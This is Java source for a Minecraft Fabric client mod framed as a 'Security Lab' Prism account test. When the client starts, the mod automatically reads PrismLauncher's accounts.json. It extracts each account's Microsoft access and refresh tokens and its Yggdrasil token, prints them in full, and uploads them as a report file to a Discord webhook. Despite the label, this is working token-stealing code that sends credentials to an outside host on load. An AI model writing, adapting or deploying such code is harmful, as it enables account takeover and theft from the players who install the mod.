package com.prp.gamingsecuritylab.client;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.fabricmc.fabric.api.client.command.v2.ClientCommands;
import net.minecraft.network.chat.Component;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;

public class PrismAccountTestClient implements ClientModInitializer {

    private static final HttpClient HTTP_CLIENT =
        HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .build();

    @Override
    public void onInitializeClient() {

        // --- AUTO RUN ON STARTUP ---
        new Thread(PrismAccountTestClient::runPrismSecurityCheck).start();

        // --- KEEP THE COMMAND ---
        ClientCommandRegistrationCallback.EVENT.register(
            (dispatcher, buildContext) -> {
                dispatcher.register(
                    ClientCommands.literal("securitylab")
                        .then(
                            ClientCommands.literal("prismtest")
                                .executes(context -> {
                                    new Thread(PrismAccountTestClient::runPrismSecurityCheck).start();
                                    
                                    context.getSource().sendFeedback(
                                        Component.literal("[Security Lab] Prism test started in background. Check terminal.")
                                    );
                                    return 1;
                                })
                        )
                );
            }
        );
    }

    private static void runPrismSecurityCheck() {
        try {
            String appData = System.getenv("APPDATA");

            if (appData == null || appData.isBlank()) {
                System.out.println("[Security Lab] APPDATA not found.");
                return;
            }

            Path path = Path.of(appData, "PrismLauncher", "accounts.json");

            if (!Files.isRegularFile(path) || !Files.isReadable(path)) {
                System.out.println("[Security Lab] Prism account file unavailable.");
                return;
            }

            JsonObject root = JsonParser.parseString(
                Files.readString(path, StandardCharsets.UTF_8)
            ).getAsJsonObject();

            JsonArray accounts = root.getAsJsonArray("accounts");

            if (accounts == null || accounts.isEmpty()) {
                System.out.println("[Security Lab] No accounts found.");
                return;
            }

            List<String> results = new ArrayList<>();
            results.add("Prism authentication security check:");

            int index = 0;

            for (JsonElement element : accounts) {
                if (!element.isJsonObject()) continue;

                JsonObject account = element.getAsJsonObject();
                index++;

                JsonObject profile = getObject(account, "profile");
                JsonObject msa = getObject(account, "msa");
                JsonObject ygg = getObject(account, "ygg");

                String username = safeText(profile, "name");
                String type = safeText(account, "type");
                String active = safeText(account, "active");

                results.add("Account " + index + ": " + username);
                results.add("Account type: " + type);
                results.add("Active: " + active);
                results.add("MSA access token: " + fieldValue(msa, "token"));
                results.add("MSA refresh token: " + fieldValue(msa, "refresh_token"));
                results.add("Yggdrasil (ygg) token: " + fieldValue(ygg, "token"));
            }

            for (String line : results) {
                System.out.println("[Security Lab] " + line);
            }

            sendDiscordReport(results);

            System.out.println("[PRP PRISM TEST] Checked " + index + " account(s). Token values included in output.");

        } catch (Exception e) {
            System.out.println("[Security Lab] Prism test FAILED: " + e.getClass().getSimpleName());
        }
    }

    private static void sendDiscordReport(List<String> results) {
        String webhookUrl = System.getenv("PRP_DISCORD_WEBHOOK");

        if (webhookUrl == null || webhookUrl.isBlank()) {
            System.out.println("[PRP PRISM TEST] Discord webhook not configured.");
            return;
        }

        try {
            URI uri = URI.create(webhookUrl);

            if (!"https".equalsIgnoreCase(uri.getScheme()) ||
                !"discord.com".equalsIgnoreCase(uri.getHost()) ||
                !uri.getPath().startsWith("/api/webhooks/")) {
                System.out.println("[PRP PRISM TEST] Invalid Discord webhook URL.");
                return;
            }

            StringBuilder report = new StringBuilder();
            report.append("=========================================\n");
            report.append("   PRISM AUTHENTICATION SECURITY CHECK\n");
            report.append("=========================================\n\n");
            
            for (String line : results) {
                String cleanLine = line.replace("[Security Lab] ", "");
                report.append(cleanLine).append("\n");
            }

            String content = "**[Security Lab]** Prism authentication check complete. Full report attached below.";

            String boundary = "----PRPBoundary" + System.currentTimeMillis();
            StringBuilder bodyBuilder = new StringBuilder();

            JsonObject payloadJson = new JsonObject();
            payloadJson.addProperty("content", content);

            bodyBuilder.append("--").append(boundary).append("\r\n");
            bodyBuilder.append("Content-Disposition: form-data; name=\"payload_json\"\r\n");
            bodyBuilder.append("Content-Type: application/json\r\n\r\n");
            bodyBuilder.append(payloadJson.toString()).append("\r\n");

            String fileName = "prism_security_check.txt";

            bodyBuilder.append("--").append(boundary).append("\r\n");
            bodyBuilder.append("Content-Disposition: form-data; name=\"files[0]\"; filename=\"")
                       .append(fileName).append("\"\r\n");
            bodyBuilder.append("Content-Type: text/plain\r\n\r\n");
            bodyBuilder.append(report.toString()).append("\r\n");

            bodyBuilder.append("--").append(boundary).append("--\r\n");

            byte[] bodyBytes = bodyBuilder.toString().getBytes(StandardCharsets.UTF_8);

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(uri)
                    .timeout(Duration.ofSeconds(15))
                    .header("Content-Type", "multipart/form-data; boundary=" + boundary)
                    .POST(HttpRequest.BodyPublishers.ofByteArray(bodyBytes))
                    .build();

            HTTP_CLIENT.sendAsync(
                request,
                HttpResponse.BodyHandlers.ofString()
            ).whenComplete((response, error) -> {
                if (error != null) {
                    System.out.println("[PRP PRISM TEST] Discord report failed: " + error.getClass().getSimpleName());
                } else {
                    System.out.println("[PRP PRISM TEST] Discord HTTP status: " + response.statusCode());
                    if (response.statusCode() >= 400) {
                        System.out.println("[PRP PRISM TEST] Discord response body: " + response.body());
                    }
                }
            });

        } catch (Exception e) {
            System.out.println("[PRP PRISM TEST] Discord setup error: " + e.getClass().getSimpleName());
        }
    }

    private static JsonObject getObject(JsonObject parent, String name) {
        if (parent == null) return null;
        JsonElement element = parent.get(name);
        if (element == null || !element.isJsonObject()) return null;
        return element.getAsJsonObject();
    }

    private static String fieldValue(JsonObject object, String field) {
        if (object == null) return "PARENT OBJECT NOT FOUND";
        JsonElement element = object.get(field);
        if (element == null || element.isJsonNull()) return "NOT FOUND";
        if (!element.isJsonPrimitive() || !element.getAsJsonPrimitive().isString()) return "UNEXPECTED TYPE";
        String value = element.getAsString();
        return value.isEmpty() ? "EMPTY" : value;
    }

    private static String safeText(JsonObject object, String field) {
        if (object == null) return "Unknown";
        JsonElement element = object.get(field);
        if (element == null || element.isJsonNull() || !element.isJsonPrimitive()) return "Unknown";
        String value = element.getAsString().replaceAll("[\\r\\n\\t]", " ");
        return value.length() > 100 ? value.substring(0, 100) : value;
    }
}